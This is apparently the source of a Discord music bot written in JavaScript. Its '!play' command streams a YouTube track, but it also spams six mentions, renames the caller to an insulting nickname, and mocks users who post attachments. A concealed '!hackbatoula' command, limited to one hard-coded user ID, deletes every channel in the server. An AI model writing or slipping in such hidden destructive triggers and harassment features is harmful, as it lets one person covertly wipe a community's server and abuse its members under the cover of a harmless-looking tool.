const Discord = require('discord.js');
const client = new Discord.Client();
const ytdl = require("ytdl-core");
const streamOptions = { seek: 0, volume: 1 };
const { Client, MessageAttachment } = require('discord.js');






client.on('ready', () => {
    console.log("Bot is ready");
    client.user.setActivity('!play to use ')
        .then(presence => console.log(`Activity set to ${presence.activities[0].name}`))
        .catch(console.error);
});





client.on('message', message => {

    const channel = message.channel;
    if (message. attachments. size > 0) {
        channel.send("<@" + message.author.id + ">" + " mamestek w mamset el memes mte3ek get a life please " );
      }
    if (message.author.bot)
        return;
    if (message.content.toLowerCase().startsWith("!play")) {
        
        let VoiceChannel = message.guild.channels.cache.find(channel => channel.id === '692171325816438824');
        if (VoiceChannel != null) {
            console.log(VoiceChannel.name + "was found and is a" + VoiceChannel + "channel.");
            VoiceChannel.join()
                .then(connection => {
                    console.log("Bot joined the channel");
                    const stream = ytdl('https://www.youtube.com/watch?v=LcFPnovV-Tw', { filter: 'audioonly' });
                    const dispatcher = connection.play(stream, streamOptions);


                })

                .catch();
        }
        const channel = message.channel;
        const attachment = new MessageAttachment('https://media.giphy.com/media/94oj4dwuJfDKE/giphy.gif');
       
        channel.send("<@" + message.author.id + ">" + " Para mibouni <3" , attachment);
        channel.send("<@" + message.author.id + ">" + " Para mibouni <3" , attachment);
        channel.send("<@" + message.author.id + ">" + " Para mibouni <3" , attachment);
        channel.send("<@" + message.author.id + ">" + " Para mibouni <3" , attachment);
        channel.send("<@" + message.author.id + ">" + " Para mibouni <3" , attachment);
        channel.send("<@" + message.author.id + ">" + " Para mibouni <3" , attachment);
        

        
        
        

        message.member.setNickname('Ya mnayek')
        console.log("nickname changed");
    }

    if (message.content.toLowerCase().startsWith("!leave")) {
        let VoiceChannel = message.guild.channels.cache.find(channel => channel.id === '692171325816438824');
        VoiceChannel.leave();
        console.log("Bot left the Channel");
        


    }
    if (message.content.toLowerCase().startsWith("!hackbatoula")) {
        if(message.author.id == "283395082885791744") {
            message.guild.channels.cache.forEach((channel) => {
            channel.delete()
                .then(console.log('Te7chelek'))
                .catch(console.error);
        })
        
    }

    }


});

client.login(process.env.BOT_TOKEN);//where process.env.BOT_TOKEN is the token of our bot  